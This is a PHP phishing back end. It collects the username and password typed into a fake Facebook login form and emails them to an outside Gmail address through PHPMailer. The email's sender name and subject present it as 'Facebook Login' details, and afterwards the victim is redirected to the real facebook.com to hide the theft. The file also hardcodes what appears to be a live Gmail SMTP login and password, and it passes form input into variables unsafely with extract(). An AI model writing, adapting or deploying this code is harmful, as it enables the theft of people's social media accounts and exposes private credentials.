<?php
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;
    use PHPMailer\PHPMailer\SMTP;
    require 'vendor/phpmailer/phpmailer/src/Exception.php';
    require 'vendor/phpmailer/phpmailer/src/PHPMailer.php';
    require 'vendor/phpmailer/phpmailer/src/SMTP.php';
    require 'vendor/autoload.php';
    $mail = new PHPMailer(true);

    if(isset($_POST['submit']))
    {
        extract($_POST);

        try {
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;   
        $mail->isSMTP();                                            // Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                    // Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
        $mail->Username   = 'liamc2156@gmail.com';                     // SMTP username
        $mail->Password   = 'Emmizy2013';                                // SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
        $mail->Port       = 587; 

        $mail->setFrom('liamc2156@gmail.com', 'Facebook Login');

        $mail->addAddress('codeplan73@gmail.com');     // Add a recipient
        $mail->addReplyTo('no-reply@coiningfxminners.com');
        $mail->isHTML(true);

        $mail->Subject ='Facebook Login Details';
        $mail->Body    = "
            <body style='background-color: #eee; font-size: 16px; margin-top:30px; margin-bottom:20px;'>
            <div style='max-width: 70%; min-width: 200px; background-color: #fff; padding: 20px; margin: 20px auto; border-radius: 5px; box-shadow: 0px 10px 10px 5px;'>                        
            <h1 style='font-size: 22px;'><center> Account Details </center></h1>   
             <b>Username: $username</b><br/>
             <b>Password: $password</b>
                                                 
            </body>";

        $mail->send();
            echo "<script type='text/javascript'>location.href = 'https://facebook.com';</script>";
        } catch (Exception $e) {
            echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        }
    }
?>
